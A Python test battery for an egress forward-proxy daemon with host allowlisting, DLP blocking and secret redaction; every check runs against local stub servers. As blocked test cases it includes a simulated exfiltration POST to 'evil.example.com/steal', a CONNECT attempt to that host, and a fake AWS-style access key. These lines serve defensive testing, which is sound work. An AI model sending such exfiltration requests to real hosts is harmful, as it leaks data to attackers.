"""Proving battery for the egress forward-proxy daemon (ForwardProxy).

Everything runs in-process against stub origins — no real network egress:

  1. allowlisted host, clean body -> request is FORWARDED, origin sees it,
     client gets the origin's response.
  2. non-allowlisted host -> 403 BLOCKED, origin never contacted.
  3. allowlisted host, body carries a secret -> 403 BLOCKED by DLP (can't
     exfiltrate THROUGH an allowed host).
  4. redact mode -> request forwarded but the secret is scrubbed from the
     bytes the origin receives.
  5. CONNECT to a non-allowlisted host -> 403 (tunnel refused).
  6. CONNECT to an allowlisted host -> 200 established and bytes relay
     end-to-end (TLS-opaque body, host-allowlist enforced).

Run:  python -m aegis.egress_proxy_daemon_test
"""

from __future__ import annotations

import http.server
import socket
import sys
import threading
import urllib.error
import urllib.request

from .egress_proxy import EgressGuard, ForwardProxy

_checks: list[tuple[str, bool]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    _checks.append((name, ok))
    print(f"  {'PASS' if ok else 'FAIL'}  {name}" + (f"  ({detail})" if detail else ""))


def _origin() -> tuple[http.server.HTTPServer, list[bytes]]:
    """A stub origin that records the body it received and echoes OK."""
    seen: list[bytes] = []

    class H(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def _do(self):
            n = int(self.headers.get("content-length", 0) or 0)
            seen.append(self.rfile.read(n) if n else b"")
            payload = b"origin-ok"
            self.send_response(200)
            self.send_header("content-length", str(len(payload)))
            self.send_header("connection", "close")
            self.end_headers()
            self.wfile.write(payload)

        do_GET = _do
        do_POST = _do

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, seen


def _tcp_echo() -> tuple[socket.socket, int]:
    """A raw TCP echo server, to prove the CONNECT tunnel relays bytes."""
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.bind(("127.0.0.1", 0))
    lsock.listen(1)

    def serve():
        try:
            conn, _ = lsock.accept()
            with conn:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    conn.sendall(b"ECHO:" + data)
        except OSError:
            pass

    threading.Thread(target=serve, daemon=True).start()
    return lsock, lsock.getsockname()[1]


def _via_proxy(proxy_port: int, url: str, data: bytes | None = None):
    handler = urllib.request.ProxyHandler({"http": f"http://127.0.0.1:{proxy_port}"})
    opener = urllib.request.build_opener(handler)
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    return opener.open(req, timeout=10)


def run() -> int:
    print("=== egress forward-proxy daemon ===\n")
    origin, seen = _origin()
    origin_port = origin.server_address[1]

    # Allowlist 127.0.0.1 so the loopback origin is reachable; DLP on.
    guard = EgressGuard({
        "allowlist_hosts": ["127.0.0.1"],
        "dlp": {"scan_secrets": True, "effect": "block",
                "sensitive_terms": ["positions"]},
    })
    proxy = ForwardProxy(guard, port=0).start()
    pp = proxy.port

    # 1. allowlisted + clean -> forwarded
    try:
        resp = _via_proxy(pp, f"http://127.0.0.1:{origin_port}/ok", data=b"hello world")
        body = resp.read()
        check("allowlisted host, clean body -> forwarded", body == b"origin-ok"
              and seen and seen[-1] == b"hello world")
    except Exception as e:
        check("allowlisted host, clean body -> forwarded", False, f"{type(e).__name__}: {e}")

    # 2. non-allowlisted -> 403, origin untouched
    before = len(seen)
    try:
        _via_proxy(pp, "http://evil.example.com/steal", data=b"x")
        check("non-allowlisted host -> blocked", False, "expected 403")
    except urllib.error.HTTPError as e:
        check("non-allowlisted host -> blocked", e.code == 403 and len(seen) == before)
    except Exception as e:
        check("non-allowlisted host -> blocked", False, f"{type(e).__name__}: {e}")

    # 3. allowlisted but secret in body -> DLP block
    before = len(seen)
    try:
        _via_proxy(pp, f"http://127.0.0.1:{origin_port}/leak",
                   data=b"here is positions data for the book")
        check("DLP blocks classified payload through allowed host", False, "expected 403")
    except urllib.error.HTTPError as e:
        check("DLP blocks classified payload through allowed host",
              e.code == 403 and len(seen) == before)

    # 4. redact mode -> forwarded but scrubbed
    redact_guard = EgressGuard({
        "allowlist_hosts": ["127.0.0.1"],
        "dlp": {"scan_secrets": True, "effect": "redact", "sensitive_terms": []},
    })
    rproxy = ForwardProxy(redact_guard, port=0).start()
    try:
        secret = b"token AKIA" + b"1234567890ABCDEF"  # AKIA + 16 => aws-access-key
        _via_proxy(rproxy.port, f"http://127.0.0.1:{origin_port}/r", data=secret)
        got = seen[-1]
        check("redact mode forwards scrubbed body",
              b"AKIA1234567890ABCDEF" not in got and b"REDACTED" in got, got[:40].decode("latin1"))
    except Exception as e:
        check("redact mode forwards scrubbed body", False, f"{type(e).__name__}: {e}")
    finally:
        rproxy.stop()

    # 5. CONNECT to non-allowlisted -> 403
    s = socket.create_connection(("127.0.0.1", pp), timeout=5)
    s.sendall(b"CONNECT evil.example.com:443 HTTP/1.1\r\nHost: evil.example.com:443\r\n\r\n")
    status = s.recv(256)
    check("CONNECT to non-allowlisted host -> refused", b"403" in status, status.split(b"\r\n")[0].decode("latin1"))
    s.close()

    # 6. CONNECT to allowlisted -> 200 + bytes relay through the tunnel
    echo, echo_port = _tcp_echo()
    s = socket.create_connection(("127.0.0.1", pp), timeout=5)
    s.sendall(f"CONNECT 127.0.0.1:{echo_port} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
    status = s.recv(256)
    established = b"200" in status
    relayed = False
    if established:
        s.sendall(b"ping")
        relayed = s.recv(256) == b"ECHO:ping"
    check("CONNECT to allowlisted host -> tunnel established", established,
          status.split(b"\r\n")[0].decode("latin1"))
    check("tunnel relays bytes end-to-end", relayed)
    s.close()
    echo.close()

    proxy.stop()
    origin.shutdown()
    failed = [n for n, ok in _checks if not ok]
    print(f"\n{'PASS' if not failed else 'FAIL'} — {len(_checks) - len(failed)}/{len(_checks)} checks")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(run())
